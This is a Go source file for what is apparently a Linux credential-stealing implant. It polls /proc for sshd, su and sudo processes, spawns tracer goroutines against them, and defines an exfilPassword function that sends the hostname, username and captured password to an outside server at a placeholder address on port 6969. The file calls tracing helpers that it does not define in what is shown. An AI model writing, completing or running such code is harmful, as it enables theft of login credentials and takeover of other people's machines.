package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"
)

func findPids() []int {
	var sshdPids []int
	currentPID := os.Getpid()
	procDirs, err := ioutil.ReadDir("/proc")
	if err != nil {
		return nil
	}
	for _, dir := range procDirs {
		if dir.IsDir() {
			pid, err := strconv.Atoi(dir.Name())
			if err == nil && pid != currentPID {
				sshdPids = append(sshdPids, pid)
			}
		}
	}
	return sshdPids
}

func isSSHPid(pid int) bool {
	cmdLine, err := ioutil.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
	if err != nil {
		return false
	}
	return regexp.MustCompile(`sshd: ([a-zA-Z]+) \[net\]`).MatchString(strings.ReplaceAll(string(cmdLine), "\x00", " "))
}

func isSUPid(pid int) bool {
	cmdLine, err := ioutil.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
	if err != nil {
		return false
	}
	return regexp.MustCompile(`^su `).MatchString(strings.ReplaceAll(string(cmdLine), "\x00", " "))
}

func isSUDOPid(pid int) bool {
	cmdLine, err := ioutil.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
	if err != nil {
		return false
	}
	return regexp.MustCompile(`^sudo `).MatchString(strings.ReplaceAll(string(cmdLine), "\x00", " "))
}

func exfilPassword(username, password string) {
	hostname, err := os.Hostname()
	if err != nil {
		return
	}
	serverURL := "http://FILL:6969/"
	values := url.Values{}
	values.Set("hostname", hostname)
	values.Set("username", username)
	values.Set("password", password)
	fullURL := fmt.Sprintf("%s?%s", serverURL, values.Encode())
	//fmt.Printf("Sending to %s\n", fullURL)
	http.Get(fullURL)
}

func main() {
	var processedFirstPID bool
	var processedPids []int
	var processedPidsMutex sync.Mutex

	for {
		sshdPids := findPids()
		for _, pid := range sshdPids {
			processedPidsMutex.Lock()
			if isSSHPid(pid) && (!processedFirstPID || !contains(processedPids, pid)) {
				if !processedFirstPID {
					processedFirstPID = true
				} else {
					//fmt.Println("SSHD process found with PID:", pid)
					go traceSSHDProcess(pid)
					processedPids = append(processedPids, pid)
				}
			}
			if isSUPid(pid) && (!processedFirstPID || !contains(processedPids, pid)) {
				if !processedFirstPID {
					processedFirstPID = true
				} else {
					//fmt.Println("SU process found with PID:", pid)
					go traceSUProcess(pid)
					processedPids = append(processedPids, pid)
				}
			}
			if isSUDOPid(pid) && (!processedFirstPID || !contains(processedPids, pid)) {
				if !processedFirstPID {
					processedFirstPID = true
				} else {
					//fmt.Println("SUDO process found with PID:", pid)
					go traceSUDOProcess(pid)
					processedPids = append(processedPids, pid)
				}
			}

			processedPidsMutex.Unlock()
		}
		time.Sleep(250 * time.Millisecond)
	}
}
